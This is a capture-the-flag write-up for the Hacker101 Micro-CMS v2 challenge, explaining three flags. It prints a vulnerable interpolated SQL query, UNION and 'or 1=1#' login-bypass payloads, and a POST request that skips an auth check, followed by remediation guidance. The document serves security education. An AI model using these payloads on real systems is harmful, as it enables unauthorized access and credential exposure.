# Micro-CMS v2 — Writeup (3/3)

**Difficulty:** Moderate  
**Category:** Web — HTTP Method Bypass, SQL Injection  
**Flags:** 3/3 (complete)  
**Platform:** Hacker101 CTF

---

## Challenge Overview

**Context:** A minimalist CMS that allows creating and editing text pages. Version 2 adds admin authentication: pages can only be edited when logged in — unlike v1.

**What you face:** A login screen that appears secure, pages editable only with a valid session, and a Python backend that constructs SQL queries via string concatenation.

**Vulnerabilities exploited:**
- SQL Injection (CWE-89) via string concatenation on the username field
- HTTP Method Bypass — auth check applies to GET only, not POST
- UNION SELECT to inject fake credentials into the authentication flow

**What you learn:**
- How SQLi via `%s % input` differs from parameterized queries
- Why authentication must be enforced regardless of HTTP method
- How UNION SELECT allows login without real credentials
- How Python tracebacks expose query structure and accelerate attacks

---

## Objective

Exploit HTTP method bypass and SQL injection in the login to capture 3 flags.

## Differences from v1

v2 requires admin authentication to edit pages. The login is vulnerable to SQL injection.

---

## Flag 0 — SQL Injection on Login (UNION-based)

**Vulnerability:** The username field is inserted directly into the SQL query using `%s % input`.

```python
cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'])
```

### Step 1: Detect the injection

Enter `'` in the username field → Python traceback returned with the query exposed.

### Step 2: Bypass via UNION SELECT

```
Username: ' UNION SELECT '123' AS password#
Password: 123
```

The query becomes:
```sql
SELECT password FROM admins WHERE username='' UNION SELECT '123' AS password#'
```

UNION injects a result with password='123'. Providing '123' as the password succeeds the login.

The flag appears in the admin panel after successful login.

---

## Flag 1 — HTTP Method Bypass (POST Bypass)

**Vulnerability:** The page edit endpoint checks authentication only for GET, not for POST.

### Step 1: Try to edit a page via GET

```
GET /page/edit/1
```

→ Redirected to login (403/302).

### Step 2: Use POST on the same endpoint

```
POST /page/edit/1
body: title=test&body=test
```

→ The edit is accepted and the flag appears in the response.

---

## Flag 2 — SQL Injection with `OR 1=1` + Credential Extraction

**Vulnerability:** SQL injection with OR for full bypass + credential extraction.

### Login payload

```
Username: ' or 1=1#
Password: anything
```

The query becomes:
```sql
SELECT password FROM admins WHERE username='' or 1=1#'
```

Returns all users. Login succeeds and the flag + real password (e.g., `grover`) appear in the response.

---

## Attack Summary

```
FLAG 0: ' UNION SELECT '123' AS password# / password=123 → admin panel
FLAG 1: POST /page/edit/1 (auth bypass via HTTP method)
FLAG 2: ' or 1=1# → login as any user + credentials exposed
```

---

## Lessons Learned

1. **SQLi via string concatenation** (`%s % input`) is critical — use `cursor.execute(query, (params,))`
2. **Auth check per HTTP method** is broken — always verify regardless of method
3. **Exposed Python traceback** leaks query structure and enables targeted SQLi
4. **UNION SELECT** allows injecting fake results into authentication
5. **Error-based SQLi**: when tracebacks are visible, use the exposed query to craft precise injections

---

## MITRE ATT&CK Mapping

| Tactic | Technique | TTP-ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Brute Force: Password Spraying | T1110.003 |
| Defense Evasion | Exploitation for Defense Evasion | T1211 |
| Collection | Data from Information Repositories | T1213 |
| Persistence | Valid Accounts: Local Accounts | T1078.003 |

## Remediation and Containment

### Technical Fixes

1. Replace string interpolation in SQL queries with parameterized statements (`cursor.execute(query, (param,))`)
2. Enforce authentication and authorization checks on all HTTP methods, not just GET
3. Disable debug tracebacks in production (never expose query structure to the user)
4. Hash stored passwords with bcrypt or argon2 instead of storing plaintext

### OWASP Top 10 2021

- **A03:2021 Injection**: SQL injection via string concatenation in authentication queries
- **A07:2021 Identification and Authentication Failures**: plaintext password storage and bypassable login
- **A05:2021 Security Misconfiguration**: Python tracebacks exposed in production

### MITRE D3FEND Countermeasures

- **D3-IPCF (Input/Payload Content Filtering)**: sanitize and parameterize all database inputs
- **D3-SPP (Strong Password Policy)**: enforce hashed, salted credential storage
- **D3-MFA (Multi-factor Authentication)**: add a second authentication factor to prevent single-point bypass

### NIST CSF 2.0

- **Protect (PR.AA-1)**: identities and credentials are issued, managed, verified, revoked
- **Protect (PR.DS-1)**: data-at-rest is protected
- **Detect (DE.CM-1)**: the network is monitored to detect potential cybersecurity events

### NIST SP 800-53 Rev. 5

- **SI-10 Information Input Validation**: check the validity of information inputs
- **IA-5 Authenticator Management**: manage information system authenticators (passwords must be hashed)
- **AC-3 Access Enforcement**: enforce approved authorizations for all HTTP methods
- **SI-11 Error Handling**: generate error messages that provide only necessary information without revealing implementation details

---

Thanks guys!! (❍ᴥ❍ʋ)

---

When a traceback hands you the raw SQL query on a silver platter, the game is already over. UNION SELECT to bypass auth, method-based access control that forgets POST exists, and plaintext passwords: this CMS is a textbook of what not to do.

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
